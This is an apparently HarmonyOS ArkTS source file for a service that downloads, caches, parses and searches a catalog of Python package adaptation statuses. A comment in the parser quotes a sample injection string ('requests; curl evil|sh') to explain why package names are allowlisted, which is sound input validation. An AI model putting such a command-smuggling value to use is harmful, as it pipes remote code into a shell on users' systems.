/**
 * PyCatalogService —— Python 包适配目录（python-status.json.gz，48K 包三态）
 *
 * 数据源：制品仓 CDN catalog/python-status.json.gz（315KB→3.3MB 解压）
 * 三态：adapted（OHPCD 适配）/ pure_python（无需适配）/ in_progress（适配中）
 * 缓存：磁盘 + 内存（指纹比对零流量，同 manifest 协议）
 */
import { http } from '@kit.NetworkKit';
import { hilog } from '@kit.PerformanceAnalysisKit';
import { common } from '@kit.AbilityKit';
import { DiscoveryService } from './DiscoveryService';
import { GunzipUtil } from './GunzipUtil';



import fs from '@ohos.file.fs';





const TAG = 'PyCatalog';
const CACHE_FILE = 'py_catalog_cache.json';

export interface PyCatalogEntry {
  name: string;
  status: string;      // 'adapted' | 'pure_python' | 'in_progress'
  category: string;    // 'database' | 'web' | ...
  version: string;     // latest 版本号（如 '3.14.0'）
}

export class PyCatalogService {
  /** 包名/版本合法字符（pip/npm/brew 生态通用安全集：字母数字 @/._+-） */
  private static safeToken(t: string): boolean {
    return /^[A-Za-z0-9][A-Za-z0-9@\/._+\-]*$/.test(t);
  }

  private static entries: PyCatalogEntry[] = [];
  private static loaded: boolean = false;
  private static loading: boolean = false;
  private static filesDir: string = '';

  static ready(): boolean {
    return PyCatalogService.loaded && PyCatalogService.entries.length > 0;
  }

  static count(): number {
    return PyCatalogService.entries.length;
  }

  /** 初始化（传 context；Index/TrayAbility 启动时调一次） */
  static init(ctx: common.Context): void {
    if (PyCatalogService.filesDir === '') {
      PyCatalogService.filesDir = ctx.filesDir;
    }
  }


  /** 强制刷新（⟳ 联动：跳过 loaded 守卫重拉并落盘；loading 并发守卫保留） */
  static refresh(): void {
    if (PyCatalogService.loading) { return; }
    PyCatalogService.loading = true;
    PyCatalogService.fetchRemote(true);
  }

  /** 确保目录就绪（磁盘缓存→网络 .gz 拉取） */
  static ensure(): void {
    if (PyCatalogService.loaded || PyCatalogService.loading) { return; }
    PyCatalogService.loading = true;
    // 1) 磁盘缓存
    if (PyCatalogService.loadDisk()) {
      PyCatalogService.loading = false;
      // 后台指纹比对更新
      PyCatalogService.fetchRemote(false);
      return;
    }
    // 2) 网络拉取
    PyCatalogService.fetchRemote(true);
  }

  private static loadDisk(): boolean {
    if (PyCatalogService.filesDir === '') { return false; }
    try {
      const path = `${PyCatalogService.filesDir}/${CACHE_FILE}`;
      if (!fs.accessSync(path)) { return false; }
      const text = fs.readTextSync(path);
      PyCatalogService.parse(text);
      hilog.info(0x0000, TAG, 'disk cache loaded: %{public}d entries', PyCatalogService.entries.length);
      AppStorage.setOrCreate('pycatalog_epoch', Date.now());
      return true;
    } catch (_) {
      return false;
    }
  }

  private static fetchRemote(force: boolean): void {
    // 纯 ArkTS：http 下载 .gz → GunzipUtil 原生 GZip API 解压（零 shell 依赖）
    const url = DiscoveryService.latest().resolveCatalogUrl('python-status.json', 'python-status.json.gz');
    const cachePath = `${PyCatalogService.filesDir}/${CACHE_FILE}`;
    const tmpGz = `${PyCatalogService.filesDir}/py_catalog.tmp.gz`;

    GunzipUtil.downloadAndGunzip(url, tmpGz).then((text: string) => {
      PyCatalogService.loading = false;
      if (text === '') {
        hilog.error(0x0000, TAG, 'catalog download+gunzip failed');
        return;
      }
      PyCatalogService.parse(text);
      // 落盘缓存
      try {
        const cf = fs.openSync(cachePath, fs.OpenMode.CREATE | fs.OpenMode.TRUNC | fs.OpenMode.WRITE_ONLY);
        fs.writeSync(cf.fd, text);
        fs.closeSync(cf.fd);
      } catch (_) {}
      hilog.info(0x0000, TAG, 'catalog loaded: %{public}d entries', PyCatalogService.entries.length);
    });
  }


  private static parse(text: string): void {
    try {
      const json: Record<string, Object> = JSON.parse(text) as Record<string, Object>;
      const arr: Object[] = (json['packages'] as Object[]) ?? [];
      const out: PyCatalogEntry[] = [];
      for (let i = 0; i < arr.length; i++) {
        const p: Record<string, Object> = arr[i] as Record<string, Object>;
        if (p === undefined || p === null) { continue; }
        // 包名/版本白名单（安全审查 H-2：远程 catalog 值会拼进 shell 命令——
        // 非法字符条目整体丢弃，"requests; curl evil|sh" 一类注入串到不了 UI 更到不了 shell）
        const nm: string = (p['name'] as string) ?? '';
        const vs: string = (p['version'] as string) ?? '';
        if (!PyCatalogService.safeToken(nm) || !PyCatalogService.safeToken(vs)) { continue; }
        out.push({
          name: nm,
          status: (p['status'] as string) ?? '',
          category: (p['category'] as string) ?? '',
          version: vs,
        });
      }
      PyCatalogService.entries = out;
      PyCatalogService.loaded = true;
      AppStorage.setOrCreate('pycatalog_epoch', Date.now());
    } catch (e) {
      hilog.error(0x0000, TAG, 'parse failed: %{public}s', `${e}`);
    }
  }

  /** 搜索（精确 > 前缀 > 包含，限条数；避免子串匹配把本体挤出首屏） */
  static search(keyword: string, limit: number = 50): PyCatalogEntry[] {
    if (!PyCatalogService.ready()) { return []; }
    const kw = keyword.toLowerCase().trim();
    if (kw === '') {
      return PyCatalogService.entries.slice(0, limit);
    }
    const exact: PyCatalogEntry[] = [];
    const prefix: PyCatalogEntry[] = [];
    const contains: PyCatalogEntry[] = [];
    for (let i = 0; i < PyCatalogService.entries.length; i++) {
      const e = PyCatalogService.entries[i];
      const n = e.name.toLowerCase();
      if (n === kw) { exact.push(e); }
      else if (n.startsWith(kw)) { prefix.push(e); }
      else if (n.indexOf(kw) >= 0) { contains.push(e); }
    }
    const out: PyCatalogEntry[] = exact.concat(prefix).concat(contains);
    return out.slice(0, limit);
  }

  /** 按状态搜索 */
  static searchByStatus(keyword: string, status: string, limit: number = 50): PyCatalogEntry[] {
    if (!PyCatalogService.ready()) { return []; }
    const kw = keyword.toLowerCase().trim();
    const out: PyCatalogEntry[] = [];
    for (let i = 0; i < PyCatalogService.entries.length && out.length < limit; i++) {
      const e = PyCatalogService.entries[i];
      if (e.status !== status) { continue; }
      if (kw === '' || e.name.toLowerCase().indexOf(kw) >= 0) {
        out.push(e);
      }
    }
    return out;
  }

  /** 单包状态查询 */
  static statusOf(name: string): string {
    for (let i = 0; i < PyCatalogService.entries.length; i++) {
      if (PyCatalogService.entries[i].name === name) {
        return PyCatalogService.entries[i].status;
      }
    }
    return '';
  }
}
